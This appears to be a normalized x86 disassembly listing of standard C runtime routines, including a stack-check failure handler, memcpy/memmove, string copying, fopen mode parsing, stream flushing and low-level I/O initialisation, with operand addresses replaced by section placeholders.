push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_44367c
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_446dba
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_446dba
pop ecx
sub_443790
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_443818 ]
jmp [ ecx * 4 + jump_table_443898 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_443904 ]
pop esi
pop edi
pop ebp
jmp sub_44b341
jmp [ ecx * 4 + jump_table_443aa0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4439a4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_443aa0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_443904 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_443aa0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_443904 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_443904 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_443904 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_443aa0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_443aa0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_443aa0 ]
sub_443af5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_443b5d
mov edi edi
push ebp
mov ebp esp
push esi
call sub_443b4a
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_443af5
pop ecx
mov esi eax
call sub_443b37
mov [ eax ] esi
pop esi
pop ebp
retn
sub_443b8f
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_445378
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_443bb7
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_443b37
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_443b37
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440791
add esp 0x14
mov eax esi
jmp r-xdata
sub_443c1f
push 0xc
push r--data
call sub_4433dc
push 0xe
call sub_4488e6
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_443c86
call sub_443421
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_44120e
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_44120e
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_443c90
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_443d1e
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_445f7b
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_445f7b
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_443def
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_4488e6
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_443e30
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_4488e6
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_443e62
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_44880c
pop ecx
pop ebp
retn
sub_443e9e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_44880c
pop ecx
pop ebp
retn
sub_443ecd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
inc esi
movzx eax [ esi ]
cmp eax 0x61
je r-xdata
mov ebx 0x109
cmp eax 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov edx 0x4000
xor ebx ebx
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp eax 0x77
je r-xdata
inc esi
inc esi
cmp [ esi ] di
jne r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
movzx eax ax
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
inc esi
movzx eax [ esi ]
cmp ax di
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_443b37
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_4500a6
add esp 0x14
test eax eax
jne r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] edi
mov [ eax ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0x10 ] ecx
cmp [ esi ] 0x20
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
sub eax 0x20
je r-xdata
inc esi
inc esi
push 0x3
push esi
push r--data
call sub_4500c6
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
inc esi
movzx eax [ esi ]
cmp ax di
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x6
pop eax
jmp r-xdata
cmp ecx edi
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] ax
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax 0x80
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
inc esi
cmp [ esi ] ax
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_4417eb
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
push 0x8
push r--data
push esi
call sub_4417eb
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_4417eb
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or ebx 0x20000
jmp r-xdata
add esi 0xe
or ebx 0x10000
jmp r-xdata
sub_444181
push 0x10
push r--data
call sub_4433dc
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4442b0
mov eax edi
call sub_443421
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_445f36
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_45010c
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_44120e
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_443e30
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_448823
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_443e9e
pop ecx
pop ecx
sub_4442bc
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_44434c
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_450281
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_4502a0
jmp r-xdata
sub_44434c
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_43f96b
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_4442bc
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4443ae
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_4443de
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_44440f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_4503aa
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_443b37
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_443b5d
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_444484
push 0x10
push r--data
call sub_4433dc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_443b4a
and [ eax ] 0x0
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
mov [ eax ] edi
call sub_443b37
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_440791
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_443421
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_450421
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44440f
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_444556
mov eax [ ebp - 0x1c ]
sub_444560
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_444592
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_444560
pop ecx
push eax
call sub_450db5
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_4445fa
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_444592
pop ecx
test eax eax
je r-xdata
push esi
call sub_444642
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_444560
push eax
call sub_450e91
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_444642
push 0x14
push r--data
call sub_4433dc
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_444713
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_443421
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_443e30
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_4446e4
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_4445fa
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_4445fa
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_444725
push 0x54
push r--data
call sub_4433dc
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_445f7b
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_445f7b
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_443421
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
